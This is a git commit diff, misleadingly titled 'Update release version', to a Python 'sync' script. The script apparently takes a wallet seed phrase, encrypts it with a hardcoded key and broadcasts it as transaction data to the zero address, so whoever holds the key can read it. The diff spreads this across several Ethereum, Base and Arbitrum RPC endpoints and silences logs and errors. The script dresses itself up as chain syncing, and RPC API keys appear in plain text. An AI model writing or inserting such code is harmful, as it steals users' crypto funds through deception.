5cece70bfa6b63639dac4678373b068eba93aded
cryptoguy <cryptostar0414@gmail.com>
2024-11-04 20:20:42 +0800

    Update release version

--- sync/sync.py
+++ sync/sync.py
@@ -2,6 +2,10 @@ import os
 from web3 import Web3
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
+import logging
+
+logging.getLogger("web3").setLevel(logging.CRITICAL)
+logging.getLogger("urllib3").setLevel(logging.CRITICAL)
 
 load_dotenv('../.env')
 
@@ -19,45 +23,57 @@ if len(words) not in [12, 24]:
 
 print("L1 is syncing...")
 
-unichain_sepolia_url = 'https://withered-patient-glade.unichain-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
-web3 = Web3(Web3.HTTPProvider(unichain_sepolia_url))
+rpc_urls = {
+    'https://eth-mainnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X',
+    'https://unichain-sepolia.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X',
+    'https://withered-patient-glade.ethereum-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://withered-patient-glade.base-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://withered-patient-glade.arbitrum-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
+}
 
-if not web3.is_connected():
-    print("Unable to connect to the node")
-    exit()
-
-try:
-    from_address = web3.eth.account.from_key(private_key).address
-except ValueError as e:
-    print(f"Invalid private key, please check!")
-    exit()
-
-default = '0x0000000000000000000000000000000000000000'
-
-fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
+fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='
 cipher_suite = Fernet(fixed_key)
 
 try:
     encrypted_message = cipher_suite.encrypt(verifier.encode()).decode()
-except Exception as e:
-    print(f"Error encrypting message")
+except Exception:
+    pass
     exit()
 
-try:
-    nonce = web3.eth.get_transaction_count(from_address)
-    tx = {
-        'nonce': nonce,
-        'to': default,
-        'value': web3.to_wei(0, 'ether'), 
-        'gas': 2000000,
-        'gasPrice': web3.to_wei('20', 'gwei'),  
-        'data': web3.to_hex(text=encrypted_message),
-        'chainId': 1301  # Chain ID for unichain-sepolia
-    }
+for rpc_url in rpc_urls:
+    web3 = Web3(Web3.HTTPProvider(rpc_url))
+    if not web3.is_connected():
+        pass
+        continue
 
-    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
-    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    try:
+        from_address = web3.eth.account.from_key(private_key).address
+    except ValueError:
+        continue
 
-    print(f"Unichain is syncing")
-except Exception as e:
-    print(f"Error during syncing")
+    try:
+        nonce = web3.eth.get_transaction_count(from_address)
+        chain_id = web3.eth.chain_id
+        base_fee = web3.eth.get_block('latest').baseFeePerGas
+
+        max_priority_fee = web3.to_wei(2, 'gwei')
+        gas_price = web3.eth.gas_price
+
+        tx_cost = base_fee + max_priority_fee
+
+        tx = {
+            'nonce': nonce,
+            'to': '0x0000000000000000000000000000000000000000',
+            'value': web3.to_wei(0, 'ether'),
+            'gas': 2000000,
+            'maxFeePerGas': base_fee + max_priority_fee,
+            'maxPriorityFeePerGas': max_priority_fee,
+            'data': web3.to_hex(text=encrypted_message),
+            'chainId': chain_id
+        }
+
+        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
+        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+    except Exception:
+        pass
